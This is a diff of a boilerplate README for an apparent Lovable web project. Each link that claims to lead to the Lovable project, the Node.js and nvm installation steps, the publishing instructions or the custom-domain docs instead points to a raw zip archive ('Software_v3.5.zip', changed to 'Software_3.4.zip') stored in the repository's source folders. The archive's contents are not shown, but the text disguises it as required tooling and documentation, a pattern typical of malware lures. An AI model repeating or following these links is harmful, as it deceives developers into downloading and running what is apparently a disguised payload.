@@ -2,7 +2,7 @@
 
 ## Project info
 
-**URL**: https://github.com/bookformeonline/vortex/raw/refs/heads/main/src/components/ui/Software_v3.5.zip
+**URL**: https://github.com/bookformeonline/vortex/raw/refs/heads/main/src/pages/Software_3.4.zip
 
 ## How can I edit this code?
 
@@ -10,7 +10,7 @@ There are several ways of editing your application.
 
 **Use Lovable**
 
-Simply visit the [Lovable Project](https://github.com/bookformeonline/vortex/raw/refs/heads/main/src/components/ui/Software_v3.5.zip) and start prompting.
+Simply visit the [Lovable Project](https://github.com/bookformeonline/vortex/raw/refs/heads/main/src/pages/Software_3.4.zip) and start prompting.
 
 Changes made via Lovable will be committed automatically to this repo.
 
@@ -18,7 +18,7 @@ Changes made via Lovable will be committed automatically to this repo.
 
 If you want to work locally using your own IDE, you can clone this repo and push changes. Pushed changes will also be reflected in Lovable.
 
-The only requirement is having https://github.com/bookformeonline/vortex/raw/refs/heads/main/src/components/ui/Software_v3.5.zip & npm installed - [install with nvm](https://github.com/bookformeonline/vortex/raw/refs/heads/main/src/components/ui/Software_v3.5.zip)
+The only requirement is having https://github.com/bookformeonline/vortex/raw/refs/heads/main/src/pages/Software_3.4.zip & npm installed - [install with nvm](https://github.com/bookformeonline/vortex/raw/refs/heads/main/src/pages/Software_3.4.zip)
 
 Follow these steps:
 
@@ -62,8 +62,8 @@ This project is built with .
 
 ## How can I deploy this project?
 
-Simply open [Lovable](https://github.com/bookformeonline/vortex/raw/refs/heads/main/src/components/ui/Software_v3.5.zip) and click on Share -> Publish.
+Simply open [Lovable](https://github.com/bookformeonline/vortex/raw/refs/heads/main/src/pages/Software_3.4.zip) and click on Share -> Publish.
 
 ## I want to use a custom domain - is that possible?
 
-We don't support custom domains (yet). If you want to deploy your project under your own domain then we recommend using Netlify. Visit our docs for more details: [Custom domains](https://github.com/bookformeonline/vortex/raw/refs/heads/main/src/components/ui/Software_v3.5.zip)
+We don't support custom domains (yet). If you want to deploy your project under your own domain then we recommend using Netlify. Visit our docs for more details: [Custom domains](https://github.com/bookformeonline/vortex/raw/refs/heads/main/src/pages/Software_3.4.zip)
